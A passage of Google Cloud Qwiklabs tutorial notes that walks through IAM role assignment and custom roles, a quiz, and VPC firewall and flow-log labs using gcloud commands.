gcloud storage cp sample2.txt gs://$DEVSHELL_PROJECT_ID
```



Username 2 cannot upload the file to Cloud Storage because it only has the Project Viewer role.

**Output:**

```
Copying file://sample2.txt 
ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.create access to the Google Cloud Storage object.
```

#### Task 4. Remove project access

In this task, you remove the Project Viewer role for Username 2. You verify that Username 2 has lost access to the Cloud Storage bucket.

##### Remove the Project Viewer role for Username 2

1. Switch to the **Username 1** Cloud Console tab.
2. On the **Navigation menu**, click **IAM & admin > IAM**.
3. For **Username 2**, click on the pencil icon edit (![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D)) button.
4. Click the delete icon next to the assigned role.
5. Click on **Save**.

Notice that the user has disappeared from the list! The user has no access now. Username 2 still has a Google Cloud account, but has no access to the project.

##### Verify that Username 2 has lost access

1. Switch to the **Username 2** Cloud Console tab.
2. Run the following command in Cloud Shell to verify that **Username 2** can no longer view the file in the bucket:

```
gcloud storage ls gs://$DEVSHELL_PROJECT_ID
```



**Output:**

```
ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.list access to the Google Cloud Storage bucket.
```

1. If you can still see the file, the access change has not taken effect yet. Wait a minute and try the command again until you see `Permission denied on resource `.
2. From the **Username 2** console, try to access the Compute Engine service. On the **Navigation menu**, click **Compute Engine > VM instances**. You will not even be able to view the Compute Engine dashboard.

![Additional Access Required](images/Hc1Su7Gsaz%2B%2BzbfZf3pkmdahh8gn9uKwP0Gv7RnNxWI%3D.png)

**Note:** **Username 2** still has a Google Cloud account, but has no access to the project from either the Cloud Console or the CLI.

#### Task 5. Add storage access

In this task, you add storage object viewer permissions for Username 2 and verify that the user can view the contents of the Cloud Storage bucket.

##### Add storage object viewer only permissions for Username 2

1. Copy the value of **Username 2** from the Qwiklabs **Connection Details** dialog.
2. Switch to the **Username 1** Cloud Console tab.
3. On the **Navigation menu**, click **IAM & admin > IAM**.
4. Click **GRANT ACCESS** to add a user.
5. For **New principals**, paste the **Username 2** value you copied from the Qwiklabs **Connection Details** dialog.

In the next step, you will use a predefined role to give Storage Object Viewer permissions to Username 2. Feel free to explore the available predefined roles.

1. For **Select a role**, select **Cloud Storage > Storage Object Viewer**.
2. Click **Save**.

##### Verify that Username 2 has storage access

1. Switch to the **Username 2** Cloud Console tab.

**Note:** **Username 2** doesn't have the Project Viewer role, so the user still can't see the project or any of its resources in the Cloud Console. For example, Username 2 still cannot view the Compute Engine dashboard. However, Username 2 has specific access to view Cloud Storage and can make API calls to view storage.

1. Run the following command in Cloud Shell to view the contents of the bucket you created earlier:

```
gcloud storage ls gs://$DEVSHELL_PROJECT_ID
```



As you can see, **Username 2** now has limited access to view Cloud Storage.

#### Task 6. Create custom roles

In this task, you create a custom role for a job role of Privacy Reviewer. This role performs data privacy reviews and needs permissions to view data in various different services, such as Cloud Storage, Cloud Bigtable, and Cloud Spanner

Google Cloud also allows for the creation of custom roles. Custom roles can be used to map your organization's specific job roles to Google Cloud permissions. A custom role can combine permissions from multiple Google Cloud services into one role and then share that new role across your entire organization.

**Note:** Generally it is better to use predefined roles first, because they are managed by Google. Creating and using custom roles allows for specific permissions to be set, but add operational overhead because they must be manually managed.



Custom roles can also be created based on an existing predefined role. However, if the predefined role that your custom role is based on changes after you create your custom role, those changes are not inherited by the custom role.

To create a custom role, a caller must possess the `iam.roles.createpermission`. By default, the owner of a project or an organization has this permission and can create and manage custom roles. In this lab, Username 1 is a project owner.

##### Create a custom role using the Cloud Console

1. Switch to the **Username 1** Cloud Console tab.
2. On the **Navigation menu**, click **IAM & admin > Roles**. This page currently displays all the predefined roles. Notice that there are many of them (there are several hundred pages of them).
3. Click **Create Role**.
4. Use the following values for the Role properties:

| **Title**          | **Description**                       | **ID**            | **Role launch stage** |
| ------------------ | ------------------------------------- | ----------------- | --------------------- |
| `Privacy Reviewer` | `Custom role to perform data reviews` | `privacyreviewer` | `Alpha`               |

Each of the placeholder values is described below:

- **Title** is a friendly title for the role, such as "Role Viewer."
- **Description** is a short description about the role, such as "My custom role description."
- **ID** must be unique.
- **Role launch stage** indicates the stage of a role in the launch lifecycle, such as Alpha, Beta, GA, or Disabled.

1. Click **Add permissions**.
2. In the **Filter** field, type `storage`, and then press **Enter**.
3. Select **storage.buckets.list**, **storage.objects.list**, and **storage.objects.get**, and then click **Add**. ![Add permissions dialog filtered to list storage roles](images/N49h1Du%2B5Q1nwxNz4gqN%2FXyVGC4kpZ3nbQ8scYLDJ%2Bk%3D.png)

**Note:** To add required permissions you may need to see next pages.

1. Click **Add permissions** again.
2. In the **Filter** field, type `spanner`, and then press **Enter**.
3. Select **spanner.databases.get** and **spanner.databases.list**, and then click **Add**.
4. Click **Add permissions** again.
5. In the **Filter** field, type `bigtable`, and then press **Enter**.
6. Select **bigtable.tables.get**, **bigtable.tables.list**, and **bigtable.tables.readRows**, and then click **Add**.

Your permissions should look like this:

![Eight assigned permissions](images/AIKNUnRVflZTx9V2xjLglDCmKfI0uvHSdt13sQd3txI%3D.png)

1. Click **Create**.

Your new custom role should now be displayed at the top of the Roles table.

##### Create a custom role using the CLI and YAML file

- Roles can also be created using the CLI and a YAML file. The YAML file contains the role definition and is in the form:

```
title: [ROLE_TITLE]
description: [ROLE_DESCRIPTION]
stage: [LAUNCH_STAGE]
includedPermissions:
- [PERMISSION_1]
- [PERMISSION_2]
```



- So the YAML for the role you just created in the Cloud Console would look like:

```
title: Privacy Reviewer
description: Custom role to perform data reviews
stage: ALPHA
includedPermissions:
- storage.buckets.list
- storage.objects.list
- storage.objects.get
- spanner.databases.get- spanner.databases.list
- bigtable.tables.get
- bigtable.tables.list
- bigtable.tables.readRows
```



Do not copy the YAML file above; you will create a different role using the CLI.

1. Verify that you are still on the browser tab for **Username 1**, and open Cloud Shell if it is not already open.
2. To create a new file called **role.yaml**, run the following command:

```
nano role.yaml
```



1. Copy the following role definition and paste into the nano editor in Cloud Shell:

```
title: App Viewer
description: Custom role to view apps
stage: ALPHA
includedPermissions:
- compute.instances.get
- compute.instances.list
- appengine.versions.get
- appengine.versions.list
```



1. Press **CTRL+X,** press **Y**, and then press **Enter** to save the file.
2. To create a new role, run the following command:

```
gcloud iam roles create app_viewer --project \
$DEVSHELL_PROJECT_ID --file role.yaml
```



You will see the following output.

**Output:**

```
Created role [app_viewer].
description: Custom role to view apps
etag: BwVshqVuvBs=
includedPermissions:
- appengine.versions.get
- appengine.versions.list
- compute.instances.get
- compute.instances.list
name: projects/xxxxxxxxxx/roles/app_viewer
stage: ALPHA
title: App Viewer
```

1. To list all the custom roles in your project, run the following command:

```
gcloud iam roles list --project $DEVSHELL_PROJECT_ID
```



You will see both roles you created.

Click *Check my progress* to verify the objective.

Create custom roles



Check my progress



#### Task 7. Use a custom role

In this task, you create a custom role and assign it to Username 2.

1. Make sure you are on the **Username 1** Cloud Console tab.
2. On the **Navigation menu**, click **IAM & admin > IAM**.
3. In the IAM console, locate the line for **Username 2** and click the Edit principal (![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D)) button. **Username 2** should currently have the **Storage Object Viewer** role.
4. Click **Add another role**, and then click **Select a role**.
5. In the **Custom** category, select one of the roles you just created.
6. Click **Save**.

You have assigned **Username 2** to one of your custom roles.

#### Task 8. Maintain custom roles

In this task, you modify, disable, delete, and un-delete a custom role.

When using custom roles, it's important to track what permissions are associated with the roles you create, because available permissions for Google Cloud services evolve and change over time. Unlike Google Cloud predefined roles, you control if and when permissions are added or removed.

##### Modify role permissions

To modify an existing role, you need to first get the role's definition, update the definition, and then update the role.

1. Make sure you are on the **Username 1** Cloud Console tab.
2. To retrieve the **app_viewer** role's definition, run the following command in Cloud Shell:

```
gcloud iam roles describe app_viewer --project \
$DEVSHELL_PROJECT_ID
```



The describe command returns the following output.

**Output:**

```
description: Custom role to view apps
etag: [Etag value]
includedPermissions:
- appengine.versions.get
- appengine.versions.list
- compute.instances.get
- compute.instances.list
name: projects/[Project_ID]/roles/app_viewer
stage: DISABLED
title: App Viewer
```

1. Copy the output from your describe command. Be sure to copy from the `description` line to the `title` line.
2. Run the following command to create a new YAML file:

```
nano update-role.yaml
```



1. Paste the output from the describe command into the nano editor.
2. Add the following two lines just below the `includedPermissions:` lines:

```
- container.clusters.get
- container.clusters.list
```



1. Press **CTRL+X,** press **Y**, and then press **Enter** to save the file.
2. To update the **app_viewer** role, run the following command:

```
gcloud iam roles update app_viewer --project \
$DEVSHELL_PROJECT_ID --file update-role.yaml
```



The **app_viewer** role has been updated and two permissions were added.

Click *Check my progress* to verify the objective.

Modify role permissions



Check my progress



##### Disable a role

You can disable a custom role. When a role is disabled, any policy bindings related to the role are inactivated, which means that the permissions in the role will not be granted, even if you grant the role to a user.

1. Make sure you are on the **Username 1** Cloud Console tab.
2. To disable the **app_viewer** role created earlier in this lab, run the following command in Cloud Shell:

```
gcloud iam roles update app_viewer --project \
$DEVSHELL_PROJECT_ID --stage DISABLED
```



##### Delete a role

Roles that are deleted are suspended and cannot be used to create new IAM policy bindings. After the role has been deleted, existing bindings remain, but are inactive. The role can be un-deleted within seven days. After seven days, the role enters a permanent deletion process that lasts 30 days.

1. Make sure you are on the **Username 1** Cloud Console tab.
2. To delete the **app_viewer** role created earlier in this lab, run the following command in Cloud Shell:

```
gcloud iam roles delete app_viewer --project \
$DEVSHELL_PROJECT_ID
```



1. To list all the roles in the project, run the following command:

```
gcloud iam roles list --project $DEVSHELL_PROJECT_ID
```



Notice that the deleted **app_viewer** role is no longer listed.

1. To list all the roles in the project including the deleted roles, run the following command:

```
gcloud iam roles list --project $DEVSHELL_PROJECT_ID \
--show-deleted
```



##### Un-delete a role

Role can be un-deleted within seven days of being deleted.

1. To un-delete the **app_viewer** role, run the following command in Cloud Shell:

```
gcloud iam roles undelete app_viewer --project \
$DEVSHELL_PROJECT_ID
```



1. To list all the roles in the project, run the following command:

```
gcloud iam roles list --project $DEVSHELL_PROJECT_ID
```



Notice that the **app_viewer** role is listed again.

#### Review

In this lab, you did the following:

1. Used IAM to implement access control.
2. Restricted access to specific features or resources.
3. Used predefined roles to provide Google Cloud access.
4. Created custom IAM roles to provide permissions based on your own job roles.
5. Modified custom roles.

### Quiz

1. Which THREE of the following are IAM Objects that can be used to organize resources in Google Cloud?

- **Project**

  Correct! A project is a collection of resources that share the same billing and lifecycle. It's the primary unit of organization in Google Cloud.

- **Organization**

  Correct! An organization is the highest level of hierarchy in Google Cloud. It allows you to manage multiple projects and accounts with a central point of administration.

- Bucket

- Instance

- Container

- Role

- Member

- **Folder**

​	Correct! Folders are used to group resources within a project. They provide a logical way to organize and manage your resources.

2. Which TWO of the following statements about Cloud IAM Policies is TRUE?

- An organization policy can only be applied to the organization node.

- **A policy is a collection of access statements attached to a resource.**

  Correct! One way to think of it is, resource policies are a union of parent and resource.

- **A Policy binding binds a list of members to a role.**

  Correct! Members can be user accounts, Google groups, Google domains, and service accounts.

- A less restrictive parent policy will not override a more restrictive child resource policy.

  

3. Projects in Google Cloud provide many management-related features, including the ability to (choose TWO)

- **Selectively enable specific services and APIs.**

  Correct! You can also assign manager permissions more effectively,

- **Track and manage quota usage.**

  Correct! You can also track general resource usage as well.

- Balance server load between different Projects.

- Keep on-prem AD/LDAP accounts synced up with user's Google Cloud resources.



## Configuring Virtual Private Cloud for Isolation and Security

### LAB - Configuring VPC Firewalls

#### Overview

In this lab, you investigate [Virtual Private Cloud (VPC)](https://cloud.google.com/vpc) networks and create firewall rules to allow and deny access to a network and instances.

You begin by creating an automatic VPC network, a custom VPC network, and some VPC instances in those networks. You verify that the default-allow-ssh firewall rule is working and then compare this to the user created custom network to verify no ingress is allowed without custom firewall rules.

After deleting the default network, you use firewall rule priorities,to allow both ingress and egress of network traffic to your VMs.

##### Objectives

In this lab, you will learn how to:

- Create an auto-mode network, a custom-mode network, and associated subnetworks.
- Investigate firewall rules in the default network and then delete the default network.
- Use features of firewall rules for more precise and flexible control of connections.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

##### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```



**Output:**

```
Credentialed accounts:
 - <myaccount>@<mydomain>.com (active)
</mydomain></myaccount>
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```



**Output:**

```
[core]
project = <project_id>
</project_id>
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

#### Task 1. Create VPC networks and instances

In this task, you create an automatic VPC network and custom VPC network, and some initial VPC instances in those networks.

1. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)) to open Cloud Shell. If prompted, click **Continue**.
2. To create the network *mynetwork* with auto subnets, run the following command:

```
gcloud compute networks create mynetwork --subnet-mode=auto
```



**Note:** When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.

You will now create a network with custom subnets. You can choose any private RFC 1918 CIDR block for the primary IP address range of the subnets.

1. To create the network *privatenet* with custom subnets, run the following command:

```
gcloud compute networks create privatenet \
--subnet-mode=custom
```



1. To create a custom subnet in the privatenet network, run the following command:

```
gcloud compute networks subnets create privatesubnet \
--network=privatenet --region=us-east4 \
--range=10.0.0.0/24 --enable-private-ip-google-access
```



1. To create some instances to use later for testing in all networks, run these commands:

```
gcloud compute instances create default-vm-1 \
--machine-type e2-micro \
--zone=us-east4-a --network=default
```



```
gcloud compute instances create mynet-vm-1 \
--machine-type e2-micro \
--zone=us-east4-a --network=mynetwork
```



```
gcloud compute instances create mynet-vm-2 \
--machine-type e2-micro \
--zone=us-central1-f --network=mynetwork
```



```
gcloud compute instances create privatenet-bastion \
--machine-type e2-micro \
--zone=us-east4-b  --subnet=privatesubnet --can-ip-forward
```



```
gcloud compute instances create privatenet-vm-1 \
--machine-type e2-micro \
--zone=us-east4-c  --subnet=privatesubnet
```



Click *Check my progress* to verify the objective.

Create VPC networks and instances



Check my progress



#### Task 2. Investigate the default network

In this task, you explore the default network and verify that the default-allow-ssh firewall rule is working. Later, you delete the default-vm-1 instance and default network because you no longer need it.

Return to the Cloud Console and view the firewall rules.

1. On the **Navigation menu**, click **VPC network > Firewall**.

The following four default rules are created for the default network:

![Four default firewall ingress rules](images/%2B3rX%2BBQoV4F%2Fs0b%2BSi9SndCb%2BjMo60W8vKASrh9dXL4%3D.png)

Remember, all networks also have the following 2 rules, which are not displayed in the console:

![Default deny all ingress and default deny all egress rules](images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png)

To check that the default-allow-ssh firewall rule is working, ssh into the default-vm-1 instance in the default network and test it.

1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
2. In the row for the **default-vm-1** instance, click **SSH**.

You should connect successfully via SSH to the instance because of the default-allow-ssh rule. You can ping `www.google.com` to test the egress connectivity. Press **Ctrl+C** to stop the ping.

##### Delete the default-vm-1 instance

Now delete the default-vm-1 instance because you no longer need it.

1. In the **Navigation menu**, click **Compute Engine > VM instances**, select the **default-vm-1** instance and then click **Delete**.
2. In the confirmation box, click **Delete**.

##### Delete the default network

**Note:** Because the default network allows relatively open access, we recommend that you delete it for production projects.

1. On the **Navigation menu**, click **VPC network > VPC networks** to display the list of VPC networks in the Cloud Console.
2. Click the **default** network to view the network details.
3. Click **Delete VPC Network**.
4. In the confirmation box, click **Delete**.
5. Wait for the network to be deleted and verify that the default network is no longer displayed on the VPC Networks page.

#### Task 3. Investigate the user-created networks

In this task, you explore the user-created networks to verify no ingress is allowed without custom firewall rules.

##### Verify that no ingress is allowed without custom firewall rules

Remember, all networks have the following 2 rules (which will not be displayed in the Console) to block all incoming traffic and allow all outgoing traffic. Unlike the default network, user-created networks do not have any other rules by default, so currently no inbound traffic is allowed.

![Default deny all ingress and default deny all egress rules](images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png)

1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
2. In the row for **mynet-vm-1** or **mynet-vm-2**, click **SSH**.

You should **NOT** be able to connect via SSH to the instances.

You will now try to SSH into an instance from the Cloud Shell.

1. Switch back to or reopen Cloud Shell.
2. To try to ssh into the **mynet-vm-2** instance, run the following command:

```
gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f
```



If prompted, type `Y` and press **Enter** twice to proceed.

We should **NOT** be able to connect via SSH to the instances. There is currently no inbound access allowed. Igonre the error message **ERROR: (gcloud.compute.ssh) [/usr/bin/ssh] exited with return code [255]**

#### Task 4. Create custom ingress firewall rules

In this task, you use Cloud Shell as your client host to test SSH connectivity to the instances. The external IP address of the Cloud Shell instance can be easily retrieved.

However, the IP address of your Cloud Shell instance can change if you close and reopen it, or if it is recycled due to inactivity. This should not be a problem during this lab. For a "real" project, you would allow the IP address of your SSH client host and there should not be a problem.

**Note:** As you just verified, the browser-based console SSH feature used to connect to VM instances does not currently work. If you want to allow that, you need a firewall rule that allows the source IP address. However, source IP addresses for browser-based SSH sessions are dynamically allocated by the Cloud Console and can vary from session to session.



For the feature to work, you must allow connections either from any IP address, or from Google's IP address range, which you can retrieve using public SPF records. Either of these options may pose unacceptable risks, depending on your requirements. Instead, you would allow the IP address of the SSH clients you are using to connect.

##### Allow SSH access from Cloud Shell

1. Switch back to or reopen Cloud Shell.
2. To retrieve the external IP address of the Cloud Shell instance, run the following commands:

```
ip=$(curl -s https://api.ipify.org)
echo "My External IP address is: $ip"
```



**Sample output** (your IP will be different):

```
My External IP address is: 35.229.72.135
```

1. To add a firewall rule that allows port 22 (SSH) traffic from the Cloud Shell IP address, run the following command:

```
gcloud compute firewall-rules create \
mynetwork-ingress-allow-ssh-from-cs \
--network mynetwork --action ALLOW --direction INGRESS \
--rules tcp:22 --source-ranges $ip --target-tags=lab-ssh
```



This firewall rule is also given a target tag of *lab-ssh*, which means it applies only to instances that are tagged with the lab-ssh tag.

1. To view the firewall rule in the Cloud Console, on the **Navigation menu**, click **VPC network > Firewall**.

It will look similar to the following, but your IP address will be different:

![Configuration for ingress lab-ssh firewall](https://cdn.qwiklabs.com/9uKhUJ%2FQAhtDY%2B5b5FXwBXuOImH%2F38MeUcSK7O6MzEk%3D)

This firewall rule will be applied only to instances tagged with *lab-ssh*. It is currently not being applied to any instances.

**Note:** You have just created and applied a firewall rule using a tag. One issue with tags is that they must be added to instances and could possibly be added or removed inadvertently. Firewall rules can also be applied to instances by the service account used. These rules will be applied automatically to all instances that use the specified service account.

1. To add the lab-ssh network tag to the **mynet-vm-2** and **mynet-vm-1** instances, run the following commands in Cloud Shell:

```
gcloud compute instances add-tags mynet-vm-2 \
    --zone us-central1-f \
    --tags lab-ssh
gcloud compute instances add-tags mynet-vm-1 \
    --zone us-east4-a \
    --tags lab-ssh
```



##### Stateful firewalls

In VPC networks, firewall rules are stateful. So for each initiated connection tracked by allow rules in one direction, the return traffic is automatically allowed, regardless of any rules.

1. To ssh into the **mynet-vm-2** instance, run the following command in Cloud Shell:

```
gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f
```



It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.

1. Type `exit` to log off the **mynet-vm-2** instance.
2. To ssh into the **mynet-vm-1** instance, run the following command in Cloud Shell:

```
 gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a
```



This connection should also succeed because the **mynet-vm-1** instance is in the same network, and the firewall rule you created is allowing access to all instances.

##### Allow all instances on the same network to communicate via ping

1. While still logged in to the **mynet-vm-1** instance, try pinging the **mynet-vm-2** instance with the command shown below. (Replace the *[PROJECT_ID]* with the PROJECT_ID for your lab exercise.)

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



The ping command will not succeed. Even though the **mynet-vm-1** and the **mynet-vm-2** instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.

1. Press **Ctrl+C** to stop ping if needed. Do not log out of the **mynet-vm-1** instance yet.
2. To open a new Cloud Shell window, click **Open a new tab** (**+**).
3. To add a firewall rule that allows ALL instances in the mynetwork VPC to ping each other, run the following command:

```
gcloud compute firewall-rules create \
mynetwork-ingress-allow-icmp-internal --network \
mynetwork --action ALLOW --direction INGRESS --rules icmp \
--source-ranges 10.128.0.0/9
```



**Note:** This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.

1. Switch back to the first Cloud Shell session that is connected to **mynet-vm-1** and run the ping again. This time it should work.

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



Notice that the hostname *mynet-vm-2* resolved to the internal IP address of the instance. The internal IP will start with *10.132.0* (for example, *10.132.0.2*). Google Cloud resolves internal hostnames for you.

1. Press **Ctrl+C** to stop ping.
2. You can also try pinging the internal IP address directly and that will also work. Press **Ctrl+C** to stop ping.
3. To locate the external IP address of **mynet-vm-2**, on the **Navigation menu**, click **Compute Engine > VM instances**.
4. Click on **mynet-vm-2**, locate and copy the external IP address of the instance.
5. From the Cloud Shell session that is connected to **mynet-vm-1**, try to ping the external IP address of the **mynet-vm-2** instance:

```
 ping <external_ip_of_mynet-vm-2>
</external_ip_of_mynet-vm-2>
```



This should **NOT** work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the *external* IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from *internal* IP addresses.

1. Press **Ctrl+C** to stop ping.

Click *Check my progress* to verify the objective.

Create custom ingress firewall rules



Check my progress



#### Task 5. Set the firewall rule priority

In this task, you set the firewall rule priority to deny ICMP traffic. You then verify that any traffic that does not match the rule priority is denied.

So far, all the rules created have been ingress allow rules, so the priority has not been important. Firewall rules can be both allow and deny, can specify ingress and egress, and have a priority from 0 to 65,535. If you do not set a priority, the default is 1,000. Rules are evaluated based on priority, starting from the lowest value. The first rule that matches gets applied.

1. In the first Cloud Shell session, verify that you are still connected to the **mynet-vm-1** instance. You can tell because the prompt will be: `qwiklabs@mynet-vm-1:~$`.

If not connected, use the following command to reconnect:

```
 gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a
```



1. Verify that you can still ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



1. Press **Ctrl+C** to stop ping.
2. Switch to your second Cloud Shell window (or open a new one).
3. In the second Cloud Shell, create a firewall ingress rule to deny ICMP traffic from any IP with a priority of 500:

```
gcloud compute firewall-rules create \
mynetwork-ingress-deny-icmp-all --network \
mynetwork --action DENY --direction INGRESS --rules icmp \
--priority 500
```



1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.

1. Press **Ctrl+C** to stop ping.

Now change the deny rule to a priority of 2,000.

1. In the second Cloud Shell, modify the firewall rule just created and change the priority to `2000`:

```
gcloud compute firewall-rules update \
mynetwork-ingress-deny-icmp-all \
--priority 2000
```



1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance again:

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.

1. Press **Ctrl+C** to stop ping.

#### Task 6. Configure egress firewall rules

In this task, you create an egress firewall rule and set the priority to 10,000. You then verify that both ingress and egress rule allow that traffic.

1. From the second Cloud Shell window, list all the current firewall rules:

```
gcloud compute firewall-rules list \
--filter="network:mynetwork"
```



Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.

Now try an egress rule.

1. Create a firewall egress rule to block ICMP traffic from any IP with a priority of `10000`:

```
gcloud compute firewall-rules create \
mynetwork-egress-deny-icmp-all --network \
mynetwork --action DENY --direction EGRESS --rules icmp \
--priority 10000
```



1. List all the current firewall rules again:

```
gcloud compute firewall-rules list \
--filter="network:mynetwork"
```



Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.

1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance and try to ping the **mynet-vm-2** instance:

```
 ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
```



**It should no longer work**. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.

1. Press **Ctrl+C** to stop ping.

Click *Check my progress* to verify the objective.

Create a firewall rule with priority and egress firewall rule.



Check my progress



#### Congratulations!

In this lab, you did the following:

- Created an auto-mode network, a custom-mode network, and associated subnetworks.
- Investigated firewall rules in the default network, and then deleted the default network.
- Used firewall rule features for more precise and flexible control of connections.

### LAB - Configuring and Using VPC Flow Logs in Cloud Logging

#### Overview

In this lab, you will investigate [VPC flow logs](https://cloud.google.com/vpc/docs/flow-logs). VPC flow logs record network flows sent from or received by VM instances. These logs can be used for network monitoring, forensics, real-time security analysis, and even for expense optimization.

During this lab you enable VPC flow logging and use Cloud Logging to view the logs. Next, you perform network monitoring, forensics, and real-time security analysis, before finally, disabling VPC flow logging.

##### Objectives

In this lab, you learn how to:

- Enable VPC flow logging for a subnet.
- Access logs via Cloud Logging.
- Filter logs for specific subnets, VMs, ports, or protocols.
- Perform network monitoring, forensics, and real-time security analysis.
- Disable VPC flow logging.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

##### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```

Copied!

**Output:**

```
Credentialed accounts:
 - <myaccount>@<mydomain>.com (active)
</mydomain></myaccount>
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```

Copied!

**Output:**

```
[core]
project = <project_id>
</project_id>
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

#### Task 1. Enable VPC flow logging

In this task, you enable flow logging for two subnets. Flow logging can also be enabled in exactly the same manner for custom user-defined networks. Flow logging can also be enabled when you create a subnet in one step.

##### **Use gcloud in Cloud Shell to enable VPC flow logging on two subnets**

1. To enable flow logging in two subnets, run the following commands in Cloud Shell:

```
gcloud compute networks subnets update default \
--region us-central1 --enable-flow-logs \
--logging-metadata=include-all
```

Copied!

```
gcloud compute networks subnets update default \
